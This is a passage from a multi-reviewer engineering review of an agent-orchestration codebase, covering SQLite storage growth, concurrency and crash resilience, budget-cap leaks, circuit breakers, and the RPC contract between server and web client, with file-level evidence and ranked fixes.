  - Spend never returns `errUnchanged`, so every usage report rewrites the chain (`step.go:524-541`). On the live copy the busiest chain is at rev 488 after 205 usage entries.
  - `Snapshot` sends every chain, archived ones included, to every channel (`views.go:51-70`).
  - The query plans show `SCAN decisions` with a temporary sort for `RecentDecisions`, and temporary sorts for `Chains` and the approvals list.
- **Measured** on a copy scaled ×60 (6,840 chains, 218k decisions, 15k approvals):
  - chains: 0.66-1.0 s, returning 37 MB of JSON
  - insights: 0.65-1.5 s
  - approvals: 0.26-0.33 s
  - The 200 ms debounce cannot keep up, and the `compute` lock (`views.go:233, 302`) makes per-chain views wait behind the board.
- **Supports:** `volume-03-cloud-design-patterns/17-materialized-view.md` (Mistakes 1 and 3) and `12-derived-data.md` (full refresh versus incremental refresh).
- **Change:**
  - A spend that changes nothing returns `errUnchanged`.
  - Index the decision kind through a generated column.
  - Build the board from the in-memory `v.standings`, recomputing only the chains that changed.
  - `Snapshot` pages finished and archived chains instead of sending them all.
- **Confidence:** MEDIUM (extrapolated, measured)

**D4 · High · Events grow without bound and nothing compacts them**
- **Evidence:**
  - Events take 70 MB of the 92 MB (measured with `dbstat`).
  - Growth was 24 MB to 96 MB from `backup-20261026-043548` to `-20261027-121236`, about 55 MB a day with 4 slots.
  - `auto_vacuum=0`, freelist 3.
  - The only event delete is `DeleteChain`.
  - Migrations 11 (`DROP COLUMN`) and 15 (an `UPDATE` with `LIKE` over every prompt) rewrite the events table in one startup transaction (`migrate.go:137-149, 191-223`).
- **Supports:** `13-schema-evolution.md` (Mistake 3, testing lock duration) and the mental model `volume-3-systems-mathematics/11-compounding.md`.
- **In 6 months:** 5-10 GB. A migration of the same kind then means minutes of startup downtime and about 2× the disk for the WAL.
- **Change:**
  - Make retention explicit. `docs/design.md:28-29` wants every session's metadata kept, so plan tiers rather than deletes.
  - Compact a chain's events once it has been done for N days: compress `text` and `data`, or move them to a monthly archive file.
  - `PRAGMA incremental_vacuum`.
  - Add the rule "a migration never rewrites events; old shapes are converted when read."
- **Confidence:** MEDIUM

**D5 · Medium · `Card.queued` is a stored derived count that drifts**
- **Evidence:**
  - It is written only at `outbox.go:396`, `outbox.go:423` and `lifecycle.go:287`.
  - `DropChainQueue` and `DropQueued` change the queue without changing it (`store.go:721-729`, `apply.go:534-539`).
  - On the live copy, 39 cards disagree with their queue. For example `c_9508e1841f04` says queued=36 while all 36 of its messages were dropped.
- **Supports:** `12-derived-data.md` (Mistake 1, no clear source of truth) and AGENTS.md:49 (one concept, one owner).
- **Change:** stop storing it. Fill it when cards are read, with a count over the `events_queued` index, the same way `costUsd` is filled (`store.go:183-186`).
- **Confidence:** HIGH that it drifts; MEDIUM on the exact cause.

**D6 · Medium · Records are orphaned because no foreign keys exist**
- **Evidence:**
  - `foreign_keys(on)` is set (`store.go:82`) but no table declares a foreign key.
  - `DeleteChain` lists its 9 tables by hand (`store.go:257-269`).
  - `ForgetDeliveries` deletes deliveries only (`delivery.go:61-63`). The Dispatcher's card, events, session init and inbox items are stored under the delivery id (`design.md:77`, `homes.go:17-19`).
- **In 6 months:** every delivery older than a week leaves rows that nothing can reach. There are 0 today because all 12 deliveries are under a week old.
- **Change:**
  - One `DeleteHome(home)` used by both the chain and the delivery paths.
  - A test that lists every table in `sqlite_schema` with a `home` or `chain_id` column and checks each one is covered.
- **Confidence:** HIGH

**D7 · Medium · A per-chain scan runs on every view refresh**
- **Evidence:** `RunningTasks` (`store.go:755-757`) runs on every `chainOf` through `watchingCards` (`views.go:353`, `background.go:219-221`). It uses `events_home` and reads each row to filter on kind and status.
- **Measured:** 0.09-0.21 s on a 60k-event chain (49 MB). The Assistant's home and the analyst chain never end, so theirs only grows.
- **Change:** add a partial index on events(home, kind) WHERE status='running', the same pattern as `events_queued` (`migrate.go:63`), and add it to the index test.
- **Confidence:** HIGH on the plan; MEDIUM on the impact.

**D8 · Medium · Migrations are not proven from every version, and "released" is undefined**
- **Evidence:**
  - Tests cover v0 to head (`migrate_test.go:115-223`) and a few single steps (`migrations[:14]` … `[:29]`), not every prefix.
  - Nothing snapshots the database before migrating (`store.go:87`).
  - The live copy is at `user_version` 30 while migration 30 is still uncommitted (`git diff internal/store/migrate.go`).
- **Supports:** `13-schema-evolution.md` (Mistakes 1 and 4).
- **In 6 months:** an edit to an "unreleased" migration that has already run on the owner's database diverges silently.
- **Change:**
  - A test that loops over `k`: migrate to `migrations[:k]`, seed, migrate to head.
  - Store a checksum per applied migration and refuse when one changes.
  - Define "released" as "applied to the owner's database".
  - Snapshot before migrating (D1).
- **Confidence:** HIGH

**D9 · Low · Streamed text is written many times over**
- **Evidence:**
  - `writeStream` rewrites the whole growing text every 500 ms (`stream.go:94-142`, `store.go:589-591`), so writes grow with the square of a message's length.
  - `synchronous` is left at its default (`store.go:82`).
- **Change:** `synchronous(NORMAL)` in WAL mode and keep the coalescing. Fine at today's sizes (p99 event is 13.5 KB).
- **Confidence:** MEDIUM

#### 4) Recommended changes, in order
1. Backups (D1), and the key id with refuse-instead-of-delete (D2).
2. `DeleteHome` plus the orphan test (D6), and `queued` computed when read (D5).
3. A spend that changes nothing writes nothing, the running-events partial index, and the decision-kind index (D3, D7).
4. An incremental board, with finished and archived chains paged out of `Snapshot` (D3).
5. Event tiering and compaction, plus the rule "no event rewrites in migrations" (D4).
6. The every-version migration test and checksums (D8).

#### 5) Stress-test of my own recommendations
- **Steelman that this is fine.** SQLite handles 10 GB easily, there is one user, and every query I measured on today's data takes under 50 ms. That is true. Event size is not the risk. The risks are backups, key handling and the board's full scans.
- **Move payloads out to files (claim check)? Rejected.** 300 events over 16 KB (0.7%) hold 15% of the bytes; the median event is 298 B. `08-claim-check.md` "When NOT to Use" lists small messages and consumers that always need the payload. Moving files out also creates the orphan and lifecycle problems from Mistakes 1, 3 and 5.
- **Put events in their own database file? Rejected for live events.** The events table is also the outbox. As far as I know SQLite (LOW, not checked against the current docs), a transaction across attached files is not atomic as a whole in WAL mode, so the queued prompt and the chain change could part on a crash. Only finished chains should be archived out.
- **Event sourcing? No.** Events are a timeline projection that is mutated in place (coalesced chunks, tool updates), not the source of state. `volume-03-cloud-design-patterns/13-event-sourcing.md:81-83` warns about snapshots and erasure costs.
- **At 10× concurrency:** about 550 MB a day. The single writer still copes, since writes are small and serialized in Go. The board computation fails first (D3), then backup size.
- **Failure modes of the fixes:** `VACUUM INTO` holds a read transaction for seconds, which delays checkpoints but blocks no writes. A key-id check that refuses could hold back launches, but showing that is the intent.
- **Assumptions:**
  - Growth was measured during development (frequent restarts, 4 slots), so it may be high or low by about 2×.
  - The 60× copy duplicates rows, so the JSON is realistic but the statistics are uniform.
  - Timings are on this container's disk, where wall time is well above CPU time.
- **Mental models:** compounding (`volume-3-systems-mathematics/11-compounding.md`) for growth; distributions (`volume-3-systems-mathematics/15-distributions.md`) for the payload tail. Probabilistic: a missing key file at some restore over 6 months is likely, not rare.

#### 6) Coverage
- **`internal/store`:** 3 of 17 files read in full (`store.go`, `migrate.go`, `delivery.go`); 2 in part (`migrate_test.go` lines 1-250, `store_test.go` 280-306). The library, webhook, changes and routine files and their tests were skipped as outside this lens, apart from searches.
- **`internal/orch`:** about 14 of 157 files read in part or full: `stream.go`, `apply.go`, `outbox.go`, `views.go`, `credentials.go`, `credentials_lostkey_test.go`, `request.go`, `recover.go`, `usage.go`, `step.go`, `lifecycle.go`, `background.go`, `library.go`, `credentials_machine.go`.
- **Also read:** `internal/secrets/secrets.go`, the Chain and Card types in `internal/model/model.go`, `docs/design.md` lines 1-125, 279-366 and 747-780, and all of AGENTS.md.
- **`standing.go`:** only the function list and the `queued` lines. The board's cost was measured through the store queries instead.
- **Live data:** a copy of the latest backup and of the live database (it is at version 30) under `/tmp/review-2`. I ran `dbstat`, the drift queries, `EXPLAIN QUERY PLAN` and timings, and built a ×60 synthetic copy.
  - While building the scaled copy I dropped the events table in two of those `/tmp` copies by accident. I re-copied the backup afterwards. The originals in `~/.remit` were only read.
- **Corpus articles:**
  - Read in full: `12-derived-data`.
  - Read in large part: `13-schema-evolution`, `08-claim-check`.
  - Read by section: `14-transactions` (Common Mistakes), `17-materialized-view` (When to Use and Common Mistakes), `01-replication` (Common Mistakes), `08-change-data-capture` (lines 272-278), `13-event-sourcing` (lines 57-83), `10-idempotency` (lines 27-93).
  - Mental models: `11-compounding` (opening only); `15-distributions` was searched, not read.
  - Not read: `03`, `11-data-models`, `11-cqrs`, `10-compensating-transaction`, `02/04-event-driven`, `06-churn` and `06-probabilistic-thinking`, for lack of time. Claims that would rest on them are labelled MEDIUM or LOW.

##### Critical Files for Implementation
- internal/store/store.go
- internal/store/migrate.go
- internal/orch/credentials.go
- internal/orch/views.go
- internal/store/delivery.go

---

## Appendix 3: Resilience and concurrency (reviewer 3 of 8)

### Reviewer 3: resilience, concurrency and distributed failure

Corpus prefix: `A=/tmp/aio-advisor-src/repo/plugins/aio-advisor`, `M=$A/skills/aio-mental-models`.

#### 1) Verdict

1. The crash-consistency core is good. Each chain has one writer, `step` is pure, and state, decisions and messages are stored in one transaction. The submit is a durable saga, and owner requests are idempotent. Narrow crash, shutdown and budget tests pass under `-race`: `ok …/internal/orch 117.435s`, run with `-o /tmp/review-3/orch.test` and nothing written to the repo.
2. The weakest area is **bounding work over time**. No agent turn has a deadline or liveness check, and the stall rail ignores agents that are mid-turn.
3. The **cost rails leak**. A budget pause leaves background sessions alive, the daily budget only controls admission, and the default caps are $1,000 per chain and $10,000 per day.
4. Provider failure handling is a real circuit breaker, but it opens on a single error, and nothing retries automatically with backoff before failover.
5. Disk use grows without limit, and there is no crash-loop breaker. These are the next 3am risks after the ones above.

#### 2) What is genuinely good (keep it)

- **One writer, one transaction.** `apply` holds `cs.mu` across step, admission and commit (`apply.go:159-214`). `commit` writes the chain, cards, decisions and queued messages in one `store.Update` (`apply.go:423-557`). Messages work as a transactional outbox: queued with the change (`outbox.go:191-205`) and marked delivered with the turn start (`outbox.go:361-414`). HIGH
- **Submit saga with forward recovery.** Each step is recorded before the next starts (`submit.go:22-29`). The push checks `ls-remote` and uses `--force-with-lease` (`submit.go:445-456`). The MR is looked up by branch before it is created (`submit.go:476-482`). Pause and finish cancel it through `cs.work` (`apply.go:51-60`). This matches the "durable coordinator, idempotent steps" requirement in `$A/volume-03-cloud-design-patterns/22-saga.md`. HIGH
- **Honest idempotency.** A request id replays its first answer. A crash mid-action is reported as "unknown, look", never redone (`request.go:31,69-77,119-120`). HIGH
- **Back-pressure to browsers.** Each browser has a bounded queue of 512 and is dropped and resynced when it falls behind (`broadcast.go:17,73-85`). The server waits until the transport has written (`broadcast.go` `written`). Notify never blocks a writer. This is the bounded-queue design in `$A/volume-04-resilience/11-back-pressure.md`. HIGH
- **Load shedding at the webhook door.** At most 100 deliveries wait (`webhook.go:33-34,76-77`) and at most 2 Dispatchers run (`main.go:53`). HIGH
- **Breaker with a single probe.** One half-open probe runs per provider (`health.go:128-147`). The scheduler holds new work while no provider answers (`admit.go:76-78`), and the stall rail is suspended during an outage (`schedule.go:270`). HIGH
- **No thundering herd after restart.** Due wakes and starts pass the slots one at a time under `tickMu` (`schedule.go:229-255`, `admit.go:79`). HIGH

**Goroutine inventory and ownership.** HIGH unless noted.

| Goroutine | Started at | Cancelled by | Waited on by |
|---|---|---|---|
| errgroup: serve, scheduler, stopper | `main.go:234-268` | signal ctx | `g.Wait` |
| `o.work`: views | `orch.go:112` | `workCtx` | `Shutdown` (`recover.go:243-259`) |
| `o.work` via `background`: session loops | `session.go:152` | `workCtx` | `Shutdown` |
| `o.work` via `background`: `chainWork` (submit, intake) | `recover.go:181-213` | `workCtx`, plus pause/finish/delete through `cs.work` | `Shutdown` |
| `o.work` via `background`: probes | `health.go:195` | `workCtx` | `Shutdown` |
| `o.work` via `background`: `SyncMRs` | `schedule.go:275` | `workCtx` | `Shutdown` |
| Not in `o.work`: per-process `Wait` | `agent.go:425` | ends with the process | — |
| Not in `o.work`: `show` timers | `apply.go:299` | — | — |
| Not in `o.work`: per-browser push | `rpc.go:127` | ends on disconnect | — |
| Not in `o.work`: drop | `broadcast.go:81` | — | — |
| Not in `o.work`: Drain waiter | `request.go:141` | ends when actions finish | — |
| Not in `o.work`: SDK reader and notifier | acp-go-sdk `connection.go:366,497` | ends with the connection | — |

- **Chain stop.** `closeRunObj` closes the mailbox, cancels the turn, kills the process group, and ends own turns and tasks (`session.go:542-569`). No goroutine leak.
- **Memory leak.** `o.runs` entries are deleted only when a chain is deleted (`archive.go:114`). Memory grows with every card ever opened. MEDIUM

**Lock inventory.**
- The orders in use are `usageMu → cs.mu → run.mu`, with card locks sorted by id (`apply.go:384`), and `takeMu → run.mu`.
- I found no path that takes `run.mu` before `cs.mu`. MEDIUM, from reading the code; the race tests are green.
- Locks held across I/O:
  - `cs.mu` across the full-table read in `room()` (`admit.go:110-126`).
  - `cs.mu` across subprocess cancel and kill in `endSessions` (`apply.go:169-171,720-737`), up to 5 s per run.
  - `takeMu` across `Steer`, up to 10 s (`outbox.go:289-300`).

#### 3) Ranked findings

**F1 High: hung turns hold slots forever.**
- Evidence: `sess.Prompt(ctx, …)` runs with `workCtx` and no deadline (`session.go:265`). `rg` finds no turn timeout in orch or agent. `stalled()` returns false while any card is mid-turn (`schedule.go:419-421`), and `unstick` treats workers mid-turn as progress and resets the nudges (`schedule.go:451-455`).
- Scenario: the adapter or CLI wedges, for example on a half-open TCP connection. The card stays `running` forever. With the default `-max-concurrent 2` (`main.go:52`), two wedged chains hold every scheduled start and wake: "all 2 slots are taken" (`admit.go:79-80`).
- Article: `$A/volume-04-resilience/02-timeout-patterns.md` ("every I/O boundary must have a timeout").
- Fix: add a liveness deadline, not a wall-clock one. A card that is running with no ACP notification for N minutes gets `cancelTurn`, then `closeRunObj` after a grace period, and its stall becomes a decision the owner sees.
- Confidence: HIGH on the code path, MEDIUM on how often it happens.

**F2 High: the budget hard cap does not stop background spend.**
- Evidence:
  - The spend pause applies only `cancelTurns, freeSlot` (`step.go:528-532`). The owner's pause also applies `stopBackground` (`step.go:318`).
  - Own turns run before `waitOpen` (`session.go:189-192`).
  - `wakeForNews` returns nil for a paused chain (`background.go:174`).
  - Further spend is ignored once the chain is not running (`budget.go:12-13`).
- Scenario: a chain reaches 1.25× its budget while an engineer's Monitor is watching CI. Each task notification starts a turn the agent takes on its own, and every one is billed with no cap.
- Article: `$M/volume-3-systems-mathematics/05-margin-of-safety.md`.
- Fix: the budget pause uses exactly the owner-pause effects, so one rule is implemented once. `runOwnTurn` stops the card when its chain is paused. Write the test first.
- Confidence: HIGH.

**F3 High: the cost rails have no margin.**
- Evidence:
  - Defaults are `-budget 1000` and `-daily-budget 10000` (`main.go:48,54`).
  - The daily budget only controls admission (`admit.go:73`). Running chains, the Assistant and Dispatchers keep spending past it (`usage.go:40-41`; `assistant_test.go:163`).
  - The cap is checked only after usage is reported (`usage.go:33-50`).
- Scenario: an hourly Scout plus autonomous chains. The worst case per day is the sum of every running chain's 1.25× cap.
- Article: `$M/volume-3-systems-mathematics/05-margin-of-safety.md`.
- Fix: a daily stop that pauses running homes (through `step`) once the day's spend reaches a ceiling, plus conservative defaults.
- Assumption: production flags are not in the repo, so the deployed values are unknown.
- Confidence: MEDIUM.

**F4 Medium: the breaker opens on one error, and failover is one-way.**
- Evidence:
  - One `overloaded` or `server_error` marks the whole provider down (`health.go:72-91`, `failure.go:28-31`). No window and no threshold.
  - `failover` then moves the card for good (`failover.go:148-160`; `design.md:766-768`).
  - With only Claude configured, the turn fails into the owner's inbox (`session.go:279`). There is no automatic jittered retry.
- Scenario: a 90 s Anthropic blip at 3am. Every failing card either migrates to Codex and loses its reasoning, or waits for the owner. This hits "having to babysit", one of the design's anti-goals.
- Articles: `$A/volume-03-cloud-design-patterns/07-circuit-breaker.md` (Mistake 1: threshold too low), `$A/volume-04-resilience/03-backoff-and-jitter.md`, `$A/volume-04-resilience/13-correlated-failures.md`.
- Fix:
  - Open the breaker on a failure rate over a window.
  - For `service` failures, re-queue the same message with jittered backoff, 2–3 attempts, before failing over.
  - Treat the 2- and 15-minute cooldowns as jittered.
- Confidence: HIGH.

**F5 Medium: disk and state are unbounded.**
- Evidence:
  - Work dirs and worktrees are removed only on the owner's Delete (`archive.go:53,101`; `recover.go:35`). A chain with an open MR cannot be deleted (`design.md:277`).
  - `agents.log` is append-only with no rotation (`main.go:151`).
  - `o.runs` grows (see the inventory above).
- Scenario: Scout chains every hour, each with worktrees and build caches. The disk fills in weeks, and then git, SQLite and agents all fail at once.
- Articles: `$A/volume-04-resilience/11-back-pressure.md` (unbounded buffers), `$M/volume-3-systems-mathematics/05-margin-of-safety.md`.
- Fix: garbage-collect worktrees of finished chains whose MRs are merged or closed, and add a free-disk check to `fits`.
- Confidence: MEDIUM.

**F6 Medium: effects that run after the commit are not durable.**
- Evidence: `stopWorkers` runs in `afterChange` after the commit (`apply.go:781-786`). After a crash, `Recover` and `ResumeInterrupted` resume cards that were mid-turn in running chains (`recover.go:104`, `recover.go:130-143`).
- Scenario: the wrap-up commits, then the process crashes. On restart the workers that were stopped are resumed with "continue where you stopped". They spend up to the 1.25× cap.
- Article: `$A/volume-08-distributed-systems/11-exactly-once-delivery.md` (effects belong in the outbox).
- Fix: make the stop part of the transition. Store the cards as stopped in the same transaction.
- Confidence: MEDIUM.

**F7 Medium: hard crash and crash-loop.**
- Evidence:
  - No `recover()` in orch background work (`rg` finds hits only in generated code).
  - Agents are started with `Setpgid` and no `Pdeathsig` (`procgroup.go:21`).
  - `recover.go:107` says "No agent process outlives this server". That holds for claude-agent-acp only because it exits on stdin EOF (`runtime/…/claude-agent-acp/dist/index.js:85-91`). codex-acp is unverified.
  - `ResumeInterrupted` resumes the same cards on every start, with no crash-loop breaker.
- Scenario: a panic on resume. Under pm2, every restart resumes the same poison card and spends tokens again.
- Fix:
  - Recover panics per work item.
  - Count starts and quarantine a card that was resumed K times without its turn ending.
- Confidence: MEDIUM / LOW.

**F8 Low: chain lock held while waiting on the ACP notification path.**
- Evidence: `recordUsage` runs on the SDK's notification goroutine and takes `cs.mu` (`usage.go:33-45`). Meanwhile `endSessions` can hold `cs.mu` for N runs × 5 s. The SDK closes the connection when its notification queue passes 1024 (`acp-go-sdk connection.go:19,446-447`).
- Fix: close sessions after unlocking, with a "closing" mark set under the lock.
- Confidence: LOW / MEDIUM.

**F9 Low: no bulkhead on intakes.**
- Evidence: every unchosen queued chain gets an intake in the same tick, and intakes need no slot (`schedule.go:102-105`, `admit.go:58`).
- Scenario: a burst of webhook or routine chains spawns N judge processes at once.
- Article: `$A/volume-03-cloud-design-patterns/04-bulkhead.md`. I did not read this article fully; the cap is plain admission control.
- Fix: cap concurrent intakes.
- Confidence: MEDIUM.

#### 4) Pre-mortem: three 3am incidents, traced through the code

1. **"Nothing ran overnight."**
   1. A Chair's turn wedges.
   2. `take` set the card to `running` (`outbox.go:366`).
   3. `Prompt` waits with no deadline (`session.go:265`).
   4. `unstick` resets the nudges every minute (`schedule.go:451`).
   5. A second wedge, or a long-lived chain, fills the other slot.
   6. Every due check-back is "held: slots taken" (`admit.go:80`).
   7. The owner's Pause frees the slot (`step.go:318`), but the card stays `running` until he stops it.
   → F1.
2. **"Chain at $1,600 on a $1,000 cap."**
   1. The autonomous chain wraps up at $1,000 (`budget.go:16`).
   2. It pauses at $1,250 with `cancelTurns` only (`step.go:532`).
   3. The engineer's Monitor reports CI news. `onWorking` creates an own turn (`background.go:96`).
   4. `runOwnTurn` → `wakeForNews` returns nil (`background.go:174`).
   5. The turn spends. `spendCmd` → `budgetAction` returns "" (`budget.go:12`).
   6. This repeats each time CI reports.
   → F2.
3. **"Half the cards moved to Codex and redid work."**
   1. Anthropic returns `overloaded` for 90 s.
   2. The first error opens the breaker for the whole provider (`health.go:85`).
   3. Every failing turn fails over and gets a recap that loses its reasoning (`failover.go:156-165`). New hires go to Codex (`failover.go:66`).
   4. When Claude is back, the probe closes the breaker (`health.go:213`), but the moved cards never return (`design.md:768`).
   5. Without Codex, failed Chairs wait in the inbox until a nudge reopens them, which can take 30+ minutes.
   → F4.

**Crash consistency (kill -9 between steps).**

| Crash point | State after restart | Repaired? |
|---|---|---|
| Chain transition | Atomic. Queued messages are dispatched again (`recover.go:162-176`). | Yes. Only the wrap-up stop is lost (F6). |
| Failover | Either the card resumes on the old provider, fails again and fails over again, or the move was stored. | Converges. |
| Submit | Carried on from the recorded step. | Yes; idempotent. |
| Outbox, between the take commit and `Prompt` | The message is marked delivered, but the agent may never have read it. The resume says "continue" (`outbox.go:383` vs `session.go:265`). | LOW confidence; depends on when the CLI writes the transcript. |
| Steered message | The agent may read it twice. Documented at `outbox.go:282`. | At-least-once by design. |
| Submit's `check` mid-rebase | The worktree is left mid-rebase. The rerun commits on a detached HEAD, then `--abort` (`submit.go:280-298`). | LOW. |

**Idempotent side effects.**
- Push: idempotent (lease plus `ls-remote`).
- MR POST: idempotent (looked up by branch first).
- MR PUT: idempotent.
- Jira: read-only.
HIGH

#### 5) Stress-test of my own recommendations

- **Opposing view on F1.** A wall-clock deadline would kill legitimate hour-long turns. That is why the fix is a liveness check: Claude's Bash tool caps a single command, so notifications keep coming from a healthy agent. False positives cost one cancelled turn, which the Chair already handles. *Assumed:* the CLI emits updates during long tools. Unverified; it is a native binary.
- **F2 / F3.** Closing watchers at the cap costs the agent its Monitors. The design already tells agents to restart them after the owner's pause, so this is no new behaviour. A daily stop could cut off an MR halfway through. Pausing goes through `step`, so it is clean.
- **F4.** Rate-based thresholds let a few more turns fail on a dead provider, but those fail fast and cheaply. Retrying at our layer stacks on the CLI's own retries, so amplification is 2 layers; cap our retries at 2.
- **10x scale.** The bottlenecks I would expect first are, in order:
  1. The single SQLite writer (`store.go:86`).
  2. `Tick` reading every chain for each candidate (`admit.go:110-117`), which is O(n²).
  3. Disk (F5).
  None of the recommendations makes these worse.
- **Inversion: what would guarantee a 3am disaster?** Unbounded turns, rails that check only on entry, a breaker that opens on one error, and disk that never shrinks. That is F1 through F5. `$M/volume-1-general-thinking/07-inversion.md`
- **Feedback loop.** Today the Chair is the retry policy: a failure produces a report, the Chair takes a turn, and that turn spends tokens. This loop is reinforcing, not balancing, during outages. `$M/volume-3-systems-mathematics/01-feedback-loops.md`

#### 6) Coverage

- **Files: about 22 of 100** non-test Go files in orch, agent, procgroup, rpc, store, webhook and cmd.
  - Read in full: `orch.go`, `recover.go`, `session.go`, `apply.go`, `admit.go`, `budget.go`, `usage.go`, `submit.go`, `failover.go`, `health.go`, `background.go`, `procgroup.go`, `request.go`, `broadcast.go`, `failure.go`.
  - Read in part: `agent.go`, `schedule.go`, `outbox.go`, `step.go`, `repo.go`, `review.go`, `intake.go`, `main.go`, `rpc.go`, the acp-go-sdk `connection.go`, and the claude-agent-acp `index.js`.
  - Skipped because the time budget went to the paths that answer this brief: `checkback.go`, `lifecycle.go` (I read only `stop`), `permission.go`, `goal.go`, `dispatcher.go`, `door.go`, `views.go`, `threads.go`, and the store internals.
- **Corpus read in full:** timeout-patterns, circuit-breaker, correlated-failures, backoff-and-jitter, saga, back-pressure, margin-of-safety, feedback-loops, inversion.
  - Not read, so cited only for their names: bulkhead and exactly-once.
  - Not opened at all: the other articles in the brief.
- **Assumptions:**
  - The production flags (pm2 config) are not in the repo.
  - codex-acp's exit on stdin EOF is unverified.
- **Repository state:** untracked `.claude/skills/aio-*` and `delivery_fields*` files were already there before my test ran (12:43 vs 12:47) and are not mine.

##### Critical Files for Implementation
- internal/orch/session.go
- internal/orch/step.go
- internal/orch/schedule.go
- internal/orch/health.go
- internal/orch/background.go

---

## Appendix 4: Contract, channels and web adapter (reviewer 4 of 8)

**Reviewer 4: contract, channels and web adapter**

#### 1) Verdict

1. The contract is good: one source, both ends generated, a drift gate, and the request id applied to all 25 mutating calls. None of the 36 calls edits the domain model. HIGH
2. The replica protocol is sound inside one connection: it subscribes before it reads, the higher `rev` wins, and a streamed chunk carries an offset so a gap is noticed. Every reconnect is a full reload. It has no version check and no paging for older events. HIGH
3. The web app is not yet a thin replica. About 17 places decide statuses, groupings, counts, caps or allowed actions that the design reserves for the server. HIGH
4. What breaks first as it grows: every change goes to every browser, a browser that falls 512 behind is dropped and reloads, and unbounded lists sit in the snapshot. MEDIUM
5. The `socketrpc-gen` risk is churn more than abandonment: 7 breaking major versions in 12 months, by the same author as Remit. Leaving it costs a moderate amount. HIGH

#### 2) What is genuinely good (keep it)

- **One contract and a drift gate.** `make gen` builds both ends and `check-gen` fails when they drift (`Makefile:12-22`). No types are copied by hand: an `rg` of type declarations outside `web/src/rpc` finds only view and UI types. HIGH
- **The calls, counted** (`define.ts:1334-1423`): 11 reads, 25 actions, 33 pushes. Every action takes `Request` first and goes through `orch.act` (`rg` found all 25). `act` waits on a duplicate already in flight, replays the stored answer including its error, answers a call cut off by a restart as "cut off" instead of running it again, and drains on shutdown (`request.go:46-165`). That is stricter than the article's "Mistake 5" (`volume-07-api-integration/05-api-idempotency.md`). HIGH
- **No RPC edits the domain model.** Every action is watching, talking, starting, or a rail (pause, stop, finish, archive, delete, answering the inbox). HIGH
- **Subscribe, then read.** The server subscribes before it answers anything (`rpc.go:97-100`). Pushes that arrive while a read is on its way are held and applied over its answer (`sync.ts:23-47`, `openChain.ts:52-90`). A chunk that does not continue the held text is skipped (`records.ts:51-54`). Derived views' `rev` starts at the process start time, so it keeps rising across restarts (`views.go:167`). HIGH
- **Bounded server memory.** `written()` waits for the transport, and a browser that cannot keep up is dropped rather than skipped (`broadcast.go:70-84, 224-248`). HIGH
- **A thin adapter with heavy tests.** `internal/rpc` is 655 lines of code against 3,124 lines of tests, including the second-channel tests (`channel_test.go:77,164`). Note that the brief's "4,452-line `types.generated.go`" is really two files: `types.generated.go` (2,670) and `server.generated.go` (1,782). HIGH
- **Small components.** 90 `.vue` files: median 53 lines, p90 129, largest `AgentLanes.vue` at 441. State lives in module singletons with readonly exports and named mutators that only `sync.ts` calls (`catalog.ts:1-5, 49`). The verify pages use a fake client typed from the generated client (`verify/fakeClient.ts:3-8`). HIGH

#### 3) Ranked findings

**C1, High: no protocol or build version, so a tab left open runs the old bundle against a new server.**
- Evidence: there is no version field anywhere (`define.ts:1096-1118`). The socket reconnects by itself (`rpc/reconnect.ts:9-23`, `sync.ts:53-58`). There is no runtime validation, and calls wait 60 s (`Makefile:13`, `client.generated.ts:629`).
- Articles: `volume-07-api-integration/03-api-versioning.md` ("avoid versioning entirely" for a single owned client), `volume-05-data-architecture/13-schema-evolution.md` (clients that do not update).
- What breaks in 6 months: after a deploy, a renamed method times out and is retried with the same id. A renamed push is never handled, while the banner still says "live".
- Change: put a build id in the handshake and the snapshot; on mismatch, reload the page. This is not API versioning.
- Confidence: HIGH that no version exists; MEDIUM on the exact symptoms (not executed).

**C2, High: every change, down to each streamed chunk, goes to every browser.**
- Evidence: one queue per browser with no filtering (`broadcast.go:71-84`). One push per chunk (`stream.go:139`). Each replica throws away what is not its own ("All are told, and each ignores what is not its own", `homes.ts:1-4`). Falling 512 behind means a disconnect, then a snapshot plus up to 20,000 events (`views.go:99`, `openChain.ts:67`).
- Articles: `volume-03-cloud-design-patterns/19-publisher-subscriber.md` (topic routing), `aio-mental-models/volume-3-systems-mathematics/01-feedback-loops.md`.
- What breaks: more agents streaming means drops; drops mean heavy reloads; heavy reloads mean more falling behind. That is a reinforcing loop.
- Change: per-socket interest in homes (the open chain, delivery or Assistant) plus app-wide topics; batch deltas per event about every 50 ms; log drops.
- Confidence: MEDIUM (not load-tested).

**C3, High: rules live in the browser.** See the audit in section 4.
- Evidence, worst case: `ChainActions.vue:27-30` picks the allowed chain actions from `status`, while agents get them from the server (`AgentStanding.asks`, `define.ts:796, 806`). There are three definitions of "working".
- Article: `volume-03-cloud-design-patterns/03-backends-for-frontends.md` ("contains no business logic", Mistake 5).
- Change: add `ChainStanding.asks`, a delivery standing (label, tone, counts), filter counts on the board, and server caps.
- Confidence: HIGH.

**C4, Medium-High: unbounded lists and over-fetching.**
- Evidence:
  - The snapshot carries every chain (`store.go:249-250`) and every archived id (`define.ts:740`).
  - It carries every skill's full file text (`model/library.go:89`), although the contract itself says skill files "could be large" (`define.ts:379`).
  - `decisions` and `edges` have no paging (`define.ts:624-636`).
  - Events come as the newest 20,000 with no cursor, so older ones cannot be reached (`views.go:99-124`).
  - The board is recomputed from every verdict ever recorded, at most every 200 ms (`store.go:860`, `views.go:204`).
- Article: `volume-07-api-integration/04-pagination.md`.
- Change: a `before` keyset cursor on `chainEvents`/`cardEvents` (the "+1" read is already there); page archived chains; load skill files on demand, as `changesGet` does.
- Confidence: HIGH.

**C5, Medium: the error model is a string.**
- Evidence: every domain error becomes `INTERNAL_ERROR` (`types.generated.go:52-63`). The browser matches the substring "sent or deleted already" (`drafts.ts:18, 82` against `store.go:29` and `orch/drafts.go:128`). `Ack.ok` is always true (`api.go:57`).
- Article: `03-api-versioning.md` (Hyrum's law: error wording becomes something clients depend on).
- Change: a named error-kind union in the contract; drop `Ack.ok`.
- Confidence: HIGH.

**C6, Medium: the field-coverage guard is opt-in and already behind.**
- Evidence: the hand-kept list of type pairs (`convert_test.go:41-112, 267-291`) misses 28 struct types and 10 enums, including `Webhook`, `Delivery`, `Agent`, `Skill`, `McpServer`, `DeliveryStatus` and `ScheduleEntryState`. `wireOf` fills a missing field with its zero value without saying so (`convert.go:8-11`).
- Article: `volume-07-api-integration/06-consumer-driven-contracts.md` (Mistake 4: contracts that go stale).
- Change: list the pairs by reflection and fail on any type left unpaired.
- Confidence: HIGH.

**C7, Medium: tones are open strings.**
- Evidence: `define.ts:641, 764, 790-791`. The allowed values exist only in comments (`standing.go:306-311`). The browser falls back to "quiet" without a word (`ui.ts:96-111`). The verify seeds build standings by hand.
